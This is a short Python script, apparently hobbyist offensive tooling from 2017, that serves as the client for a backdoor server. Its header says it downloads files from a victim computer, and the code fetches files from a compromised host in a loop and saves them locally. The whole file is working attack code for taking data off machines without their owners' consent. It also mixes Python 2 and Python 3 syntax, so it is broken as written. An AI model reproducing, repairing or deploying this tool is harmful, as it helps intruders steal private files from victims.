#!/usr/bin/env python3
# badoor_client.py
# This is a script to use with the badoor_server that allows
# to download files from a victim computer.
#
# Mateus-n00b, February 2017
#
# License GPLv3
#
# Version 1.0
# -=======================================================================
import http.client as hc
import sys,re

if len(sys.argv) < 3:
    print "Usage: %s <target> <port>" % sys.argv[0]
    sys.exit(1)

TARGET      =           sys.argv[1]
PORT        =           sys.argv[2]

try:
    ht = hc.HTTPConnection(TARGET,PORT)
except Exception as err:
    print "[-] Error to connect!\n{0}".format(err)
    sys.exit(1)

def parser(htmlTxt):
    text = ""
    lst = []
    TAG_RE = re.compile(r'<[^>]+>')
    text = TAG_RE.sub('',htmlTxt)

    return text.rstrip()

def request(obj=""):
    ht.request(method="GET", url="/"+obj)
    return ht.getresponse().read()

def main():
    print parser(request())

    while 1:
        down = raw_input("\nDownload file=> ")
        rep = parser(request(down))
        print rep
        fp = open(down,'wb')
        fp.write(rep)
        fp.close()
        print "[+] Download completed!"

if __name__ == '__main__':
    main()
